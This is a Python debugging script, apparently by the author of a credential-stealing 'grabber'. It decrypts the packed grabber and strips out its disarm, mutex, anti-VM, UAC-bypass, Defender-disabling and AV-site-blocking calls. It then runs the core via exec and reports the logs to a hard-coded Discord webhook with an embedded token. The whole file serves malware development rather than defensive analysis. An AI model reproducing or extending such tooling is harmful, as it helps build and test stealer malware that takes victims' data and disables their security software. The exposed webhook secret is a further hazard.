"""
Debug v3 — descriptografa o grabber, REMOVE as travas (disarm, mutex, anti-vm)
e tenta rodar pra ver se o core funciona.
"""
import os, sys, time, traceback, base64, zlib, json, urllib.request, re

WEBHOOK = "https://discord.com/api/webhooks/1554882578476179506/p1PLMEgZh3Nzz4sqrMbXkhYqzs0SWfQUB1Hr9TfjHQDuvJ0dn-axSmPNIGMeNzqrJeWZ"
GRABBER = r"d:\Arquivos importantes\Grabbers\Trabalho cyber\ms_packed.py"

lines = []
def log(msg):
    ts = time.strftime("%H:%M:%S")
    l = f"[{ts}] {msg}"
    print(l, flush=True)
    lines.append(l)

def send():
    try:
        txt = "\n".join(lines[-80:])
        for i in range(0, len(txt), 1900):
            chunk = txt[i:i+1900]
            data = json.dumps({"username":"DBG-v3","content":f"```\n{chunk}\n```"}).encode()
            req = urllib.request.Request(WEBHOOK, data=data, headers={"Content-Type":"application/json"})
            urllib.request.urlopen(req, timeout=10)
            time.sleep(0.5)
    except Exception as e:
        print(f"webhook fail: {e}")

try:
    log("=== DEBUG V3 ===")

    # 1. Decrypt
    with open(GRABBER, "r") as f:
        code = f.read()
    
    el = code.strip().split("\n")
    key_b64 = data_b64 = None
    for line in el:
        if '_k=_b.b64decode("' in line:
            key_b64 = line.split('"')[1]
        elif '_d=_b.b64decode("' in line:
            data_b64 = line.split('"')[1]
    
    key = base64.b64decode(key_b64)
    data = base64.b64decode(data_b64)
    dec = bytearray(len(data))
    for i in range(len(data)):
        dec[i] = data[i] ^ key[i % len(key)]
    source = zlib.decompress(bytes(dec)).decode("utf-8")
    log(f"decrypted: {len(source)} bytes, {source.count(chr(10))} lines")

    # 2. Patch out dangerous module-level code
    # Remove _run_disarm_phase() call
    source = source.replace("_run_disarm_phase()", "pass  # DBG: disarm removed")
    source = source.replace("del _run_disarm_phase, _sp, _tm, _CLEAN_BASE", "pass  # DBG: del removed")
    log("patched: _run_disarm_phase removed")

    # Remove mutex check — replace the entire block
    source = source.replace(
        "if not _create_mutex():",
        "if False:  # DBG: mutex disabled"
    )
    log("patched: mutex disabled")

    # Remove anti-VM
    source = source.replace(
        "if is_vm():",
        "if False:  # DBG: anti-vm disabled"
    )
    log("patched: anti-vm disabled")

    # Remove UAC bypass call in main
    source = source.replace(
        "_uac_bypass()",
        "pass  # DBG: uac bypass disabled"
    )
    log("patched: uac bypass disabled")

    # Remove nuke defender
    source = source.replace(
        "_nuke_defender()",
        "pass  # DBG: nuke defender disabled"
    )
    source = source.replace(
        "_block_av_sites()",
        "pass  # DBG: block av disabled"
    )
    log("patched: defender nuke disabled")

    # 3. Check what imports are needed
    log("--- checking critical imports ---")
    try:
        import requests
        log(f"requests: OK (v{requests.__version__})")
    except ImportError:
        log("FATAL: requests module NOT available!")
        # Try to install it
        log("attempting pip install...")
        try:
            import subprocess
            r = subprocess.run([sys.executable, "-m", "pip", "install", "requests"],
                             capture_output=True, text=True, timeout=30)
            log(f"pip: {r.returncode} - {r.stdout[-200:]}")
        except Exception as e:
            log(f"pip failed: {e}")

    try:
        import sqlite3
        log("sqlite3: OK")
    except ImportError:
        log("FATAL: sqlite3 NOT available!")

    try:
        import winreg
        log("winreg: OK")
    except ImportError:
        log("winreg NOT available")

    # 4. Run the patched source
    log("--- executing patched grabber ---")
    
    # Save patched source for inspection
    patched_path = os.path.join(os.environ.get("TEMP","."), "grabber_patched.py")
    with open(patched_path, "w", encoding="utf-8") as f:
        f.write(source)
    log(f"saved patched to: {patched_path}")

    g = {
        "__file__": GRABBER,
        "__name__": "__main__",
        "__builtins__": __builtins__,
    }
    
    compiled = compile(source, "grabber_patched.py", "exec")
    log("compile OK, running...")
    exec(compiled, g)
    log("exec returned OK!")

except SystemExit as e:
    log(f"SystemExit: {e.code}")
    tb = traceback.format_exc()
    log(tb[-500:])
except Exception as e:
    log(f"EXCEPTION: {type(e).__name__}: {e}")
    tb = traceback.format_exc()
    log(tb[-800:])

log("=== END ===")
send()

try:
    lp = os.path.join(os.environ.get("TEMP","."), "grabber_debug3.log")
    with open(lp, "w") as f:
        f.write("\n".join(lines))
    log(f"saved: {lp}")
except: pass
